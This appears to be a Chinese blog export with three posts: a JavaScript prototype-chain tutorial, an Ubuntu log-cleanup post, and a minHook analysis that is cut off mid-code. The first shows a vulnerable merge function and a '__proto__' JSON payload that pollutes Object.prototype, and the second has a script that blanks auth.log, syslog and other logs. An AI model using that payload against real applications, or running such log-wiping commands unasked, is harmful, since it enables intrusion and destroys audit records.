<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">doSomething.prototype</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">doSomething 函数有一个默认的原型属性如下：</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    constructor: ƒ doSomething(),</span></span><br><span class="line"><span class="comment">    __proto__: &#123;</span></span><br><span class="line"><span class="comment">        constructor: ƒ Object(),</span></span><br><span class="line"><span class="comment">        hasOwnProperty: ƒ hasOwnProperty(),</span></span><br><span class="line"><span class="comment">        isPrototypeOf: ƒ isPrototypeOf(),</span></span><br><span class="line"><span class="comment">        propertyIsEnumerable: ƒ propertyIsEnumerable(),</span></span><br><span class="line"><span class="comment">        toLocaleString: ƒ toLocaleString(),</span></span><br><span class="line"><span class="comment">        toString: ƒ toString(),</span></span><br><span class="line"><span class="comment">        valueOf: ƒ valueOf()</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们可以添加一些属性到 doSomething 的原型上面</span></span><br><span class="line">doSomething.prototype.foo = <span class="string">"bar"</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//然后，我们可以使用 new 运算符来在现在的这个原型基础之上，创建一个 doSomething 的实例。</span></span><br><span class="line"><span class="keyword">var</span> doSomeInstancing = <span class="keyword">new</span> doSomething();</span><br><span class="line">doSomeInstancing.prop = <span class="string">"some value"</span>; <span class="comment">// add a property onto the object</span></span><br><span class="line"><span class="built_in">console</span>.log( doSomeInstancing );</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    prop: "some value",</span></span><br><span class="line"><span class="comment">    __proto__: &#123;</span></span><br><span class="line"><span class="comment">        foo: "bar",</span></span><br><span class="line"><span class="comment">        constructor: ƒ doSomething(),</span></span><br><span class="line"><span class="comment">        __proto__: &#123;</span></span><br><span class="line"><span class="comment">            constructor: ƒ Object(),</span></span><br><span class="line"><span class="comment">            hasOwnProperty: ƒ hasOwnProperty(),</span></span><br><span class="line"><span class="comment">            isPrototypeOf: ƒ isPrototypeOf(),</span></span><br><span class="line"><span class="comment">            propertyIsEnumerable: ƒ propertyIsEnumerable(),</span></span><br><span class="line"><span class="comment">            toLocaleString: ƒ toLocaleString(),</span></span><br><span class="line"><span class="comment">            toString: ƒ toString(),</span></span><br><span class="line"><span class="comment">            valueOf: ƒ valueOf()</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>其实<code>doSomeInstancing</code> 的 <code>__proto__</code> 属性就是<code>doSomething.prototype</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">doSomeInstancing.__proto__ === doSomething.prototype</span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>当你访问 <code>doSomeInstancing</code> 的一个属性, 浏览器首先查找 <code>doSomeInstancing</code> 是否有这个属性. 如果 <code>doSomeInstancing</code> 没有这个属性, 然后浏览器就会在 <code>doSomeInstancing</code> 的 <code>__proto__</code> 中查找这个属性(也就是 doSomething.prototype). 如果 doSomeInstancing 的 <code>__proto__</code> 有这个属性, 那么 doSomeInstancing 的 <code>__proto__</code>上的这个属性就会被使用. 否则, 如果 doSomeInstancing 的 <code>__proto__</code> 没有这个属性, 浏览器就会去查找 doSomeInstancing 的 <code>__proto__</code> 的 <code>__proto__</code> ，看它是否有这个属性. 默认情况下, 所有函数的原型属性的 <code>__proto__</code> 就是 <code>window.Object.prototype</code>.注意<code>window.Object.prototype.__proto__</code>是不存在的。</p>
<p>在console界面输入<code>person.</code>可以看到<code>person</code>这个对象的可用的成员名称,除了我们定义在<code>Person()</code>构造器中的成员之外还有一些<code>watch</code>,<code>valueOf</code>等成员，这些成员定义在 <code>Person()</code> 构造器的原型对象、即 <code>Object</code> 之上。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">person1 ----<span class="keyword">inherit</span>----&gt; <span class="module-access"><span class="module"><span class="identifier">Person</span>.</span></span>prototype----<span class="keyword">inherit</span>----&gt;<span class="module-access"><span class="module"><span class="identifier">Object</span>.</span></span>prototype</span><br></pre></td></tr></table></figure>

<p>注意<strong>：必须重申，原型链中的方法和属性</strong>没有<strong>被复制到其他对象——它们被访问需要通过前面所说的“原型链”的方式。</strong></p>
<h4 id="prototype-属性：继承成员被定义的地方"><a href="#prototype-属性：继承成员被定义的地方" class="headerlink" title="prototype 属性：继承成员被定义的地方"></a>prototype 属性：继承成员被定义的地方</h4><p>如果你查看 <code>Object</code> 参考页，会发现左侧列出许多属性和方法——大大超过我们在 <code>person1</code> 对象中看到的继承成员的数量。某些属性或方法被继承了，而另一些没有——为什么呢？</p>
<p>继承的属性和方法是定义在 <code>prototype</code> 属性之上的（你可以称之为子命名空间 (sub namespace) ）——那些以 <code>Object.prototype.</code> 开头的属性，而非仅仅以 <code>Object.</code> 开头的属性。<code>prototype</code> 属性的值是一个对象，我们希望被原型链下游的对象继承的属性和方法，都被储存在其中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person1.valueOf === <span class="built_in">Object</span>.prototype.valueOf </span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>这里可能有些疑惑，构造器本身就是函数，你怎么可能在构造器这个函数中定义一个方法呢？其实函数也是一个对象类型，你可以查阅 <code>Function()</code> 构造器的参考文档以确认这一点。</p>
<p>每一个函数对象（<code>Function</code>）都有一个<code>prototype</code>属性，并且<em>只有</em>函数对象有<code>prototype</code>属性，因为<code>prototype</code>本身就是定义在<code>Function</code>对象下的属性。当我们输入类似<code>var person1=new Person(...)</code>来构造对象时，JavaScript实际上参考的是<code>Person.prototype</code>指向的对象来生成<code>person1</code>。另一方面，<code>Person()</code>函数是<code>Person.prototype</code>的构造函数，也就是说<code>Person===Person.prototype.constructor</code>。</p>
<p>看到了，就大概明白了定义在 <code>prototype</code> 上的方法和定义在 <code>构造函数</code> 里的方法有啥区别了，例如如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name + <span class="string">'.'</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样写的结果是，当我们新创建一个<code>Person</code>对象的时候，<code>this.greeting = function() { ... }</code> 就会执行一次，这样 <code>greeting</code> 方法其实是绑定在对象上的，而不是绑定在<code>Person</code>上的,也就是每个实例都有自己的<code>greeting</code> 他们不会相互干扰。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; person1 = <span class="keyword">new</span> Person(); </span><br><span class="line">&lt; Person &#123;<span class="attr">name</span>: <span class="literal">undefined</span>, <span class="attr">greeting</span>: ƒ&#125;</span><br><span class="line">&gt; person2 = <span class="keyword">new</span> Person();</span><br><span class="line">&lt; Person &#123;<span class="attr">name</span>: <span class="literal">undefined</span>, <span class="attr">greeting</span>: ƒ&#125;</span><br><span class="line">&gt; person1.greeting == person2.greeting</span><br><span class="line">&lt; <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>因为<code>greeting</code>方法没有定义在<code>prototype</code>,所以<code>greeting</code>方法也不会被继承。</p>
<p>但是我们考虑下面的写法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name + <span class="string">'.'</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; person1 = <span class="keyword">new</span> Person(); </span><br><span class="line">&lt; Person &#123;<span class="attr">name</span>: <span class="literal">undefined</span>&#125;</span><br><span class="line">&gt; person2 = <span class="keyword">new</span> Person();</span><br><span class="line">&lt; Person &#123;<span class="attr">name</span>: <span class="literal">undefined</span>&#125;</span><br><span class="line">&gt; person1.greeting == person2.greeting</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>我们看到，两个实例共享了同一个方法。但是思考一个问题，如果我们改了<code>person1.greeting</code>那是不是<code>person2.greeting</code>也会被改变了呢，做个试验：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; person1.greeting = <span class="string">'test'</span></span><br><span class="line">&lt; <span class="string">"test"</span></span><br><span class="line">&gt; person2.greeting</span><br><span class="line">&lt; ƒ () &#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name + <span class="string">'.'</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>哈哈想多了哈，这样操作的结果只会是让<code>person1</code>多一个<code>greeting</code>属性：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/07/2019-07-18-20-36-48.png" alt="http://pic.wonderkun.cc/uploads/2019/07/2019-07-18-20-36-48.png"></p>
<p>因为优先级的关系，这里覆盖掉了原型中的<code>greeting</code>方法。</p>
<p>如果真的想改，那就是原型链污染的问题了，可以如下操作：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; person1.__proto__.greeting = <span class="string">'test'</span></span><br><span class="line">&lt; <span class="string">"test"</span></span><br><span class="line">&gt; person2.greeting</span><br><span class="line">&lt; <span class="string">"test"</span></span><br></pre></td></tr></table></figure>

<h4 id="create"><a href="#create" class="headerlink" title="create()"></a>create()</h4><p>曾经讲过如何用 <code>Object.create()</code> 方法创建新的对象实例。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person2 = <span class="built_in">Object</span>.create(person1);</span><br><span class="line"><span class="comment">//create() 实际做的是从指定原型对象创建一个新的对象。这里以 person1 为原型对象创建了 person2 对象。在控制台输入：</span></span><br><span class="line">person2.__proto__ === person1</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h4 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h4><p>每个实例对象都从原型中继承了一个constructor属性，该属性指向了用于构造此实例对象的构造函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person1.constructor === Person</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>一个小技巧是，你可以在 <code>constructor</code> 属性的末尾添加一对圆括号（括号中包含所需的参数），从而用这个构造器创建另一个对象实例。毕竟构造器是一个函数，故可以通过圆括号调用；只需在前面添加 <code>new</code> 关键字，便能将此函数作为构造器使用。</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">person2 = <span class="keyword">new</span> person1<span class="function">.<span class="keyword">constructor</span><span class="params">("person2")</span>;</span></span><br></pre></td></tr></table></figure>

<h4 id="修改原型"><a href="#修改原型" class="headerlink" title="修改原型"></a>修改原型</h4><p>可以通过修改原型，来更新整个继承链。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给Person动态添加一个方法</span></span><br><span class="line">Person.prototype.farewell = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.name.first + <span class="string">' has left the building. Bye for now!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后由Person构造器创建的对象都有了这个方法，可以直接调用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person1.farewell();</span><br></pre></td></tr></table></figure>

<p>这种继承模型下，上游对象的方法不会复制到下游的对象实例中；下游对象本身虽然没有定义这些方法，但浏览器会通过上溯原型链、从上游对象中找到它们。这种继承模型提供了一个强大而可扩展的功能系统。</p>
<p>依次类推，也可以在<code>prototype</code>上定义可以被直接继承的属性，但是一般这样的属性都是常属性，如果常属性和构造函数中的属性重名，构造函数中的属性就会屏蔽掉<code>prototype</code>上定义的属性，但是可以通过<code>person1.__proto__.</code>的方式获取。</p>
<p>但是你不可以按照下面的方式写代码,因为本例中 <code>this</code> 引用全局范围，而非函数范围:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Person.prototype.fullName = <span class="keyword">this</span>.name.first + <span class="string">' '</span> + <span class="keyword">this</span>.name.last;</span><br></pre></td></tr></table></figure>

<p>因此，一种极其常见的对象定义模式是，在构造器（函数体）中定义属性、在 <code>prototype</code>属性上定义方法。</p>
<h3 id="0x5-原型式的继承"><a href="#0x5-原型式的继承" class="headerlink" title="0x5 原型式的继承"></a>0x5 原型式的继承</h3><p>关于继承，这篇文章讲的很好了<a href="https://juejin.im/entry/58dfbe0361ff4b006b166388" target="_blank" rel="noopener">https://juejin.im/entry/58dfbe0361ff4b006b166388</a>，经常翻翻看，可以增强对继承的理解。</p>
<h4 id="实现属性的继承"><a href="#实现属性的继承" class="headerlink" title="实现属性的继承"></a>实现属性的继承</h4><p>到目前为止我们已经了解了一些关于原型链的实现方式以及成员变量是如何通过它来实现继承，那么我们如何创建一个继承自另一对象的JavaScript对象呢？</p>
<p>不同于其他的面向对象语言，JavaScript使用了另一套实现方式，继承的对象函数并不是通过复制而来，而是通过原型链继承（通常被称为 <strong>原型式继承 ——</strong> <strong>prototypal inheritance）</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, gender, interests</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = &#123;</span><br><span class="line">    first,</span><br><span class="line">    last</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.gender = gender;</span><br><span class="line">  <span class="keyword">this</span>.interests = interests;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//所有的方法都定义在构造器的原型上</span></span><br><span class="line">Person.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name.first + <span class="string">'.'</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>创建一个Teacher类，继承于Person类：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Teacher</span>(<span class="params">first, last, age, gender, interests, subject</span>) </span>&#123;</span><br><span class="line">  Person.call(<span class="keyword">this</span>, first, last, age, gender, interests);</span><br><span class="line">  <span class="keyword">this</span>.subject = subject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>call</code>这个函数允许您调用一个在这个文件里别处定义的函数。第一个参数指明了在您运行这个函数时想对此函数中原本的<code>this</code>指定的值，也就是说，您可以重新指定您调用的函数里所有“<code>this</code>”指向的对象。这里指定了<code>Person</code>中的<code>this</code>其实是<code>Teacher</code>的示例.</p>
<p>所以在这个例子里，我们很有效的在<code>Teacher()</code>构造函数里运行了<code>Person()</code>构造函数,在<code>Teacher()</code>里定义的一样的属性，但是用的是传送给<code>Teacher()</code>，而不是<code>Person()</code>的值（这里使用的类似于值传递的方式实现的，跟我们在其他语言中理解的继承不一样）。</p>
<h4 id="设置-Teacher-的原型和构造器引用"><a href="#设置-Teacher-的原型和构造器引用" class="headerlink" title="设置 Teacher() 的原型和构造器引用"></a>设置 Teacher() 的原型和构造器引用</h4><p>到目前为止一切看起来都还行，但是我们遇到问题了。我们已经定义了一个新的构造器，这个构造器默认有一个空的原型属性。<br>所以<code>Teacher()</code>并没有<code>Person()</code>的 <code>greeting</code> 方法，所以我们需要让<code>Teacher()</code>从<code>Person()</code>的原型对象里继承方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Teacher.prototype = <span class="built_in">Object</span>.create(Person.prototype);</span><br><span class="line"></span><br><span class="line">Teacher.prototype === Person.prototype</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line">Teacher.prototype.__proto__ === Person.prototype</span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>我们用<code>create</code>函数来创建一个和<code>Person.prototype</code>一样的新的原型属性值（这个属性指向一个包括属性和方法的对象），然后将其作为<code>Teacher.prototype</code>的属性值。这意味着<code>Teacher.prototype</code>现在会继承<code>Person.prototype</code>的所有属性和方法。</p>
<p>现在<code>Teacher()</code>的<code>prototype</code>的<code>constructor</code>属性指向的是<code>Person()</code>, 这是由我们生成<code>Teacher()</code>的方式决定的（这篇 <a href="https://stackoverflow.com/questions/8453887/why-is-it-necessary-to-set-the-prototype-constructor" target="_blank" rel="noopener">Stack Overflow post</a> 文章会告诉您详细的原理)，我们需要做一个修改：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Teacher.prototype.constructor</span><br><span class="line"><span class="comment">// Person</span></span><br><span class="line">Teacher.prototype.constructor = Teacher;</span><br></pre></td></tr></table></figure>

<p>任何您想要被继承的方法都应该定义在构造函数的<code>prototype</code>对象里，并且<em>永远</em>使用父类的<code>prototype</code>来创造子类的<code>prototype</code>，这样才不会打乱类继承结构。</p>
<p>向<code>Teacher()</code>中添加新的<code>greeting()</code>函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Teacher.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    consol.log(<span class="string">'greeting'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x6-原型链污染一般存在的两种paylod"><a href="#0x6-原型链污染一般存在的两种paylod" class="headerlink" title="0x6 原型链污染一般存在的两种paylod"></a>0x6 原型链污染一般存在的两种paylod</h3><p>根据上面的基础知识我们知道，如果<code>person</code>是<code>Person</code>的实例，那么必然存在两个等式成立</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">person<span class="function">.<span class="keyword">constructor</span> == <span class="title">Person</span></span></span><br><span class="line"><span class="function"><span class="title">person</span>.__<span class="title">proto__</span> == <span class="title">Person</span>.<span class="title">prototype</span></span></span><br></pre></td></tr></table></figure>

<p>所以就有两种利用 <code>person</code> 获取到 <code>Object</code> 的<code>prototype</code>的方法</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. person.__proto__.__proto__ == <span class="keyword">Object</span>.prototype</span><br><span class="line"><span class="number">2</span>. person<span class="function">.<span class="keyword">constructor</span>.<span class="title">prototype</span>.__<span class="title">proto__</span> == <span class="title">Object</span>.<span class="title">prototype</span></span></span><br></pre></td></tr></table></figure>

<p>但是如果<code>person</code>不是由构建函数产生的，是直接定义的对象：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person = &#123;</span><br><span class="line">  <span class="string">"name"</span>:<span class="string">'hello'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时 <code>person</code> 的原型直接就是 <code>Object</code> 了,他的构造器也是<code>Object</code>，所以下面两个等式成立：</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. person.__proto__ == <span class="keyword">Object</span>.prototype</span><br><span class="line"><span class="number">2</span>. person<span class="function">.<span class="keyword">constructor</span>.<span class="title">prototype</span> == <span class="title">Object</span>.<span class="title">prototype</span></span></span><br></pre></td></tr></table></figure>

<h4 id="会造成原型链污染的例子"><a href="#会造成原型链污染的例子" class="headerlink" title="会造成原型链污染的例子"></a>会造成原型链污染的例子</h4><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
<p>在文章中说的比较明白: </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面不会造成原型链污染：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let o2 = &#123;a: 1, __proto__: &#123;b: 2&#125;&#125;</span></span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>这是因为，我们用JavaScript创建o2的过程<code>（let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}）</code>中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<p>但是下面这样就会造成原型链污染了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>参考链接：</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Basics" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Basics</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object-oriented_JS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object-oriented_JS</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object_prototypes" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object_prototypes</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p>
<p><a href="https://www.cnblogs.com/shuiyi/p/5305435.html" target="_blank" rel="noopener">https://www.cnblogs.com/shuiyi/p/5305435.html</a></p>
<p><a href="https://juejin.im/entry/58dfbe0361ff4b006b166388" target="_blank" rel="noopener">https://juejin.im/entry/58dfbe0361ff4b006b166388</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
]]></content>
      <categories>
        <category>代码控</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>linux (ubuntu)  清理系统日志</title>
    <url>/2016/05/17/linux%20(ubuntu)%20%20%E6%B8%85%E7%90%86%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<a id="more"></a>

<p>我正在安安静静的写(xia)代(dian)码(ying)呢,突然系统报了一个错,说磁盘已经没有可用空间了,然后系统就卡死了……….</p>
<p>吓得我一阵紧张,赶紧把我存的电影全部删除了,然后查了一下磁盘占有量.</p>
<img class="alignnone size-full wp-image-430" src="/uploads/2016/05/深度截图20160517143928.png" alt="深度截图20160517143928" width="731" height="293" />

<p>删除我的视频之后我的硬盘才仅有9.4G的空间,我的空间都哪里去了???</p>
<p>然后在系统中搜索大文件,最后定位到我的/var/log目录</p>
<img class="alignnone size-full wp-image-432" src="/uploads/2016/05/深度截图20160517144153.png" alt="深度截图20160517144153" width="619" height="398" />

<p>我可爱的42G,就这么没了,呵呵呵呵呵呵………</p>
<p>不得不说,日志是个好东西,但是像这样磁盘1/3都用来存储日志了,真是有点过了,所以定时做一些清理,是很必要的.</p>
<p>首先说一下错误的清理日志的方法</p>
<p>[bash]</p>
<p>rm -f logfile &nbsp;#这样做是错误的,因为应用已经打开文件句柄,这样操作会造成</p>
<p>#1.应用无法正确释放日志文件和写入</p>
<p>#2.显示磁盘空间未释放</p>
<p>[/bash]</p>
<p>百度了一下别人的方法:</p>
<p>[bash]</p>
<p>echo “” &gt; /var/log/logfile  #第一种方法</p>
<p>cat  /dev/null &gt;  /var/log/logfile  #第二种方法</p>
<p>[/bash]</p>
<p>但是这两种方法我执行之后是这样的结果:</p>
<img class="alignnone size-full wp-image-433" src="/uploads/2016/05/深度截图20160517145243.png" alt="深度截图20160517145243" width="915" height="162" />

<p>想想也对,我的sudo仅仅是对cat和echo 起作用,并没有对重定向起作用,所以就说没有权限.</p>
<p>我最后用的是下面这种办法</p>
<p>[bash]</p>
<p>echo -n  “” | sudo  tee /var/log/bootstrap.log   #这样就不会报错了</p>
<p>[/bash]</p>
<p>好了,写一个清理的脚本吧,其实可以把脚本加入到计划任务中去,定时清理.</p>
<p>[bash]</p>
<p>#!/bin/sh</p>
<p>sudo apt-get auto-clean<br>sudo apt-get clean<br>sudo apt-get autoremove</p>
<p>echo -n “” | sudo tee /var/log/messages<br>echo -n “” | sudo tee /var/log/user.log<br>echo -n “” | sudo tee /var/log/auth.log<br>echo -n “” | sudo tee /var/log/syslog<br>echo -n “” | sudo tee /var/log/apache2/access.log<br>echo -n “” | sudo tee /usr/local/nginx/logs/access.log<br>echo -n “” | sudo tee /usr/local/nginx/logs/error.log</p>
<p>exit</p>
<p>[/bash]</p>
<p>ok,运行一下,看一下磁盘,这下干净多了</p>
<img class="alignnone size-full wp-image-434" src="/uploads/2016/05/深度截图20160517145958.png" alt="深度截图20160517145958" width="672" height="253" />

<p>好了,继续看电影….,奥不对,写代码了.</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>minHook源码阅读分析</title>
    <url>/2019/03/19/minHook%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="minhook源码阅读分析"><a href="#minhook源码阅读分析" class="headerlink" title="minhook源码阅读分析"></a>minhook源码阅读分析</h2><p>minhook是一个inline Hook的库，同时支持x32和x64系统，并且是开源的，地址在这里<a href="https://www.codeproject.com/Articles/44326/MinHook-The-Minimalistic-x-x-API-Hooking-Libra" target="_blank" rel="noopener">https://www.codeproject.com/Articles/44326/MinHook-The-Minimalistic-x-x-API-Hooking-Libra</a>。下面就简单的分析一下它的工作过程。</p>
<a id="more"></a>
<h3 id="0x1-调用实例"><a href="#0x1-调用实例" class="headerlink" title="0x1 调用实例"></a>0x1 调用实例</h3><p>首先看一下官网上给出的c的调用的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"./include/MinHook.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *MESSAGEBOXW)</span><span class="params">(HWND, LPCWSTR, LPCWSTR, UINT)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pointer for calling original MessageBoxW.</span></span><br><span class="line">MESSAGEBOXW fpMessageBoxW = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Detour function which overrides MessageBoxW.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">DetourMessageBoxW</span><span class="params">(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span 